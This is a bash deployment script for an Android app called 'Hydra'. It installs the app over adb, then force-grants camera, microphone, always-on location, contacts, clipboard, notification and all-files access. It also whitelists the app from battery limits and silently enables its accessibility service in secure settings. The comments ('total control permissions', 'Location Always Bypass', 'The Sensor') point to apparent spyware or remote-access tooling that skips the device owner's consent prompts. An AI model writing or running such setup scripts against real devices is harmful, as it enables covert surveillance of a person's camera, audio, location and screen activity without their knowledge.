#!/bin/bash

# --- CONFIGURATION ---
PKG_NAME="com.hydra.client"
# Only the class name here
ACC_CLASS=".HydraAccessibilityService" 
# The full component path
FULL_COMPONENT="$PKG_NAME/$ACC_CLASS"
SERVICE_NAME=".HydraService"
# Correct format: package/full.class.Path
ACC_SERVICE=".HydraAccessibilityService"
APK_PATH="app/build/outputs/apk/debug/app-debug.apk"

echo "--- 🛠️ Starting Hydra Deployment ---"

# 1. Uninstall completely
# This ensures a clean slate and forces the OS to re-parse the Manifest later
echo "[*] Uninstalling old version..."
adb uninstall $PKG_NAME || true

# 2. Build and Install again
echo "[*] Compiling APK..."
./gradlew assembleDebug
if [ $? -ne 0 ]; then
    echo "[-] Build Failed! Check your Kotlin code."
    exit 1
fi

echo "[*] Installing $APK_PATH..."
adb install $APK_PATH

# --- 🛠️ UNIVERSAL PERMISSION GRANT (ANDROID 11+) ---
echo "[*] Granting total control permissions..."

# 1. Hardware Permissions (Standard)
for perm in \
    android.permission.CAMERA \
    android.permission.RECORD_AUDIO \
    android.permission.ACCESS_FINE_LOCATION \
    android.permission.ACCESS_COARSE_LOCATION \
    android.permission.ACCESS_BACKGROUND_LOCATION \
    android.permission.READ_EXTERNAL_STORAGE \
    android.permission.WRITE_EXTERNAL_STORAGE \
    android.permission.READ_PHONE_STATE \
    android.permission.READ_CONTACTS \
    android.permission.ACCESS_WIFI_STATE \
    android.permission.CHANGE_WIFI_STATE
do
    adb shell pm grant $PKG_NAME $perm 2>/dev/null
done

# 2. File System "All Access" (Android 11 Specific)
# This is required to see files outside the app's own folder
adb shell appops set $PKG_NAME MANAGE_EXTERNAL_STORAGE allow

# 3. Background & Operational Ops
echo "[*] Configuring background behavior..."
adb shell cmd appops set $PKG_NAME START_FOREGROUND allow
adb shell cmd appops set $PKG_NAME GET_USAGE_STATS allow
adb shell cmd appops set $PKG_NAME SYSTEM_ALERT_WINDOW allow # Draw over other apps
adb shell cmd appops set $PKG_NAME ACCESS_NOTIFICATIONS allow
adb shell cmd appops set $PKG_NAME READ_CLIPBOARD allow

# 4. Location "Always" Bypass
# Android 11 defaults location to 'Only while in use'. This forces it to 'Always'.
adb shell cmd appops set $PKG_NAME android:fine_location allow
adb shell cmd appops set $PKG_NAME android:background_location allow

# 5. Disable Battery Optimization (The Doze Killer)
adb shell dumpsys deviceidle whitelist +$PKG_NAME

# 6. Ensure SSID/Network visibility (Needs Location + Wifi State)
adb shell cmd appops set $PKG_NAME wifi_scan allow

echo "[+] All permissions and AppOps applied."

# 5. Disable Battery Optimization
echo "[*] Whitelisting from battery optimization..."
adb shell dumpsys deviceidle whitelist +$PKG_NAME

# 6. Wake up the App
echo "[*] Launching MainActivity..."
adb shell am start -n $PKG_NAME/.MainActivity
sleep 2

# 7. Force the system to rescan services
# This kills the settings process to clear the cached list of available A11y services
echo "[*] Refreshing System Settings cache..."
adb shell am force-stop com.android.settings

# 8. Force Enable Accessibility (The Sensor)
echo "[*] Triggering Accessibility Service Binding..."
# Reset state first
adb shell settings put secure enabled_accessibility_services $FULL_COMPONENT
sleep 1
# Enable with the explicit component path
# Note: Using $PKG_NAME/$ACC_SERVICE (concatenating the package and class)
adb shell settings put secure enabled_accessibility_services $PKG_NAME/$ACC_SERVICE
adb shell settings put secure accessibility_enabled 1

echo "--- ✅ Deployment Complete ---"
echo "[!] Monitor logs with: adb logcat -s Hydra Hydra-DEBUG HydraService HydraCapture"